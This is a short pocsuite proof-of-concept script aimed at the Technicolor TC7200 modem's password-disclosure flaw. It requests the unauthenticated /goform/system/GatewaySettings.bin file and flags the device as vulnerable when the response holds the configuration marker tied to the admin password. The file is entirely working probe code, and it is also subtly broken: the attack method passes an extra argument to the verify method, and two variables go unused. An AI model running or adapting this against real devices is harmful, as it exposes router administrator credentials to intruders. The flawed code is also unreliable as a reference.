#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register



class TestPOC(POCBase):
    name = "Technicolor TC7200 Password Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Password Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/31894'
    desc = 'Module exploits Technicolor TC7200 password disclosure vulnerability which allows fetching administration\'s password.'

    vulDate = ''
    createDate = '2017-10-26'
    updateDate = '2017-10-26'

    appName = 'Technicolor TC7200'
    appVersion = ''
    dork = ''
    appPowerLink = ''
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        nuser = 'ruser'
        npass = 'rpass'
        url = self.url + "/goform/system/GatewaySettings.bin"
        resp = req.get(url)

        if resp.status_code == 200 and '0MLog' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url



        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
